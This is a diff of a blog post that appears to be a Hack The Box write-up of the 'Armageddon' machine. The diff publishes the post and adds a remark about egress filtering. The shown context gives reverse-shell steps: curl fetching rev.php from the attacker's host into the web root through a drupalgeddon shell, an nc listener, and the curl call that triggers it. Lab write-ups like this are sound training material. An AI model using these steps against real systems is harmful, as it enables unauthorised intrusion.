@@ -1,7 +1,7 @@
 ---
 layout: post
 title: Armageddon
-published: false
+published: true
 ---
 
 **Armageddon is an easy box from Hack The Box.**
@@ -58,6 +58,8 @@ First, I host my reverse shell on a web server of my own with `sudo python -m Si
 Then `curl http://10.10.14.22/rev.php -o rev.php` in the drupalgeddon shell to pull it down and write it to the web root.
 
 Finally, start a listener on my box with `nc -lvnp 80` and call the reverse shell with `curl 10.10.10.233/rev.php`.
+
+I had initially tried to get a listener on port 4444, but it did not work. There is probably a firewall rule limiting outgoing connections to 80 or 443, as those are the only 2 ports I was able to get a connection on.
 
 ![Pasted image 20210621123707](https://user-images.githubusercontent.com/60187707/126874292-ab142bd9-0880-4d07-b6ee-825673a2d22c.png)
 
